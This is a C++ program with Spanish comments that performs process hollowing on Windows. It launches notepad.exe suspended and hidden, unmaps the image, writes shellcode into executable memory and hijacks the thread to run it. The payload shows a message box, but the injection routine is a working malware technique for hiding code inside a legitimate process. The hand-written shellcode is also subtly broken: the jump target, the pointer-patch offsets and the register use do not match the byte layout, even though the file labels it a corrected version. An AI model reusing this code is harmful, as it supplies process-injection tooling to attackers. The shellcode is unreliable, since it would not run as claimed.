#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <psapi.h>

// Prototipos de funciones
typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);

// Estructuras para NtQueryInformationProcess
typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

#define ProcessBasicInformation 0
#define STATUS_SUCCESS 0x00000000

// Shellcode para MessageBox (64 bits) - VERSIÓN CORREGIDA
unsigned char shellcode[] = {
    // Saltar sobre los datos para evitar ejecutarlos como código
    0xEB, 0x2E,                               // jmp short $+0x30 (saltar a start)
    
    // Datos: Mensaje y Título
    'H', 'o', 'l', 'a', ' ', 'd', 'e', 's', 'd', 'e', ' ', 'e', 'l', ' ', 'p', 'a', 'y', 'l', 'o', 'a', 'd', '!', 0,
    'H', 'o', 'l', 'l', 'o', 'w', ' ', 'P', 'r', 'o', 'c', 'e', 's', 's', 0,
    
    // MessageBoxA pointer (se llenará en tiempo de ejecución)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    
    // ExitThread pointer (se llenará en tiempo de ejecución)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    
    // Código real comienza aquí
    // start:
    0x48, 0x31, 0xC9,                         // xor rcx, rcx        ; hWnd = NULL
    0x48, 0x8D, 0x15, 0xCB, 0xFF, 0xFF, 0xFF, // lea rdx, [rip-53]   ; lpText = mensaje
    0x49, 0x8D, 0x45, 0x17,                   // lea r8, [r13+23]    ; lpCaption = título
    0x48, 0x31, 0xF6,                         // xor rsi, rsi        ; uType = MB_OK
    
    // Llamar a MessageBoxA
    0x48, 0x8B, 0x45, 0x37,                   // mov rax, [rbp+55]   ; MessageBoxA pointer
    0xFF, 0xD0,                               // call rax            ; llamar a MessageBoxA
    
    // Salir del hilo
    0x48, 0x31, 0xC9,                         // xor rcx, rcx        ; ExitCode = 0
    0x48, 0x8B, 0x45, 0x3F,                   // mov rax, [rbp+63]   ; ExitThread pointer
    0xFF, 0xD0,                               // call rax            ; llamar a ExitThread
};

int main() {
    // 1. Crear payload (shellcode para MessageBox)
    std::cout << "[+] Creando payload para MessageBox..." << std::endl;
    
    // Obtener direcciones de las funciones necesarias
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    
    if (!hUser32 || !hKernel32) {
        std::cerr << "[-] Error al cargar las bibliotecas necesarias" << std::endl;
        return 1;
    }
    
    FARPROC pMessageBoxA = GetProcAddress(hUser32, "MessageBoxA");
    FARPROC pExitThread = GetProcAddress(hKernel32, "ExitThread");
    
    if (!pMessageBoxA || !pExitThread) {
        std::cerr << "[-] Error al obtener direcciones de funciones" << std::endl;
        return 1;
    }
    
    // Modificar el shellcode con las direcciones reales
    // MessageBoxA pointer (posición 0x3E en el shellcode)
    memcpy(shellcode + 0x3E, &pMessageBoxA, sizeof(void*));
    // ExitThread pointer (posición 0x46 en el shellcode)
    memcpy(shellcode + 0x46, &pExitThread, sizeof(void*));
    
    std::cout << "[+] Payload creado correctamente" << std::endl;
    
    // 2. Crear proceso suspendido (notepad.exe)
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    std::cout << "[+] Creando proceso suspendido de notepad.exe..." << std::endl;
    
    if (!CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,  // Evitar que se muestre la ventana
        NULL,
        NULL,
        &si,
        &pi)) {
        std::cerr << "[-] Error al crear el proceso: " << GetLastError() << std::endl;
        return 1;
    }
    
    std::cout << "[+] Proceso creado con PID: " << pi.dwProcessId << std::endl;
    
    // 3. Obtener la dirección base del proceso remoto usando NtQueryInformationProcess
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtQueryInformationProcess NtQueryInformationProcess = 
        (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    
    if (!NtQueryInformationProcess) {
        std::cerr << "[-] Error al obtener NtQueryInformationProcess" << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    
    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;
    NTSTATUS status = NtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength);
    
    if (status != STATUS_SUCCESS) {
        std::cerr << "[-] Error en NtQueryInformationProcess: 0x" << std::hex << status << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    
    // Leer la dirección base de la imagen desde el PEB
    // En Windows 10 64-bit, ImageBaseAddress está en PEB + 0x10
    DWORD_PTR imageBaseAddress;
    SIZE_T bytesRead;
    
    if (!ReadProcessMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 0x10, &imageBaseAddress, sizeof(DWORD_PTR), &bytesRead)) {
        std::cerr << "[-] Error al leer la dirección base: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    
    std::cout << "[+] Dirección base de la imagen: 0x" << std::hex << imageBaseAddress << std::endl;
    
    // 4. Hacer unmap de la imagen original
    pNtUnmapViewOfSection NtUnmapViewOfSection = 
        (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    
    if (!NtUnmapViewOfSection) {
        std::cerr << "[-] Error al obtener NtUnmapViewOfSection: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    
    // Desmapear la sección original
    status = NtUnmapViewOfSection(pi.hProcess, (PVOID)imageBaseAddress);
    
    if (status != STATUS_SUCCESS) {
        std::cerr << "[-] Error en NtUnmapViewOfSection: 0x" << std::hex << status << std::endl;
        // Continuar de todos modos, puede que no sea crítico
        std::cout << "[+] Continuando a pesar del error..." << std::endl;
    } else {
        std::cout << "[+] Imagen original desmapeada correctamente" << std::endl;
    }

    // 5. Asignar memoria y escribir el payload
    SIZE_T shellcodeSize = sizeof(shellcode);
    
    std::cout << "[+] Asignando memoria en el proceso remoto..." << std::endl;
    
    // Intentar asignar en la misma dirección base primero
    LPVOID newBase = VirtualAllocEx(pi.hProcess, (LPVOID)imageBaseAddress, 
                                   shellcodeSize, MEM_COMMIT | MEM_RESERVE, 
                                   PAGE_EXECUTE_READWRITE);
    
    if (!newBase) {
        // Si falla, asignar en cualquier ubicación disponible
        newBase = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, 
                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!newBase) {
            std::cerr << "[-] Error al asignar memoria: " << GetLastError() << std::endl;
            TerminateProcess(pi.hProcess, 1);
            return 1;
        }
        std::cout << "[+] Memoria asignada en nueva ubicación: 0x" << std::hex << newBase << std::endl;
    } else {
        std::cout << "[+] Memoria asignada en la dirección base original: 0x" << std::hex << newBase << std::endl;
    }
    
    if (!WriteProcessMemory(pi.hProcess, newBase, shellcode, shellcodeSize, NULL)) {
        std::cerr << "[-] Error al escribir en memoria: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    
    std::cout << "[+] Payload escrito en la memoria del proceso remoto" << std::endl;
    
    // 6. Establecer el contexto del hilo para el punto de entrada del payload
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    
    if (!GetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "[-] Error al obtener el contexto del hilo: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    
    // En arquitecturas x64, el registro RIP contiene el puntero de instrucción
    ctx.Rip = (DWORD_PTR)newBase + 0x30;  // Saltar al inicio del código real (después del jmp)
    
    if (!SetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "[-] Error al establecer el contexto del hilo: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    
    std::cout << "[+] Contexto del hilo modificado correctamente" << std::endl;
    std::cout << "[+] Nuevo punto de entrada: 0x" << std::hex << ctx.Rip << std::endl;
    
    // 7. Resumir el proceso
    std::cout << "[+] Resumiendo el proceso..." << std::endl;
    
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        std::cerr << "[-] Error al reanudar el hilo: " << GetLastError() << std::endl;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    
    std::cout << "[+] Proceso resumido. El payload debería ejecutarse ahora." << std::endl;
    std::cout << "[+] Si todo fue bien, debería aparecer un MessageBox con el mensaje 'Hola desde el payload!'" << std::endl;
    
    // Esperar un poco para que el mensaje aparezca
    Sleep(2000);
    
    // Cerrar handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return 0;
}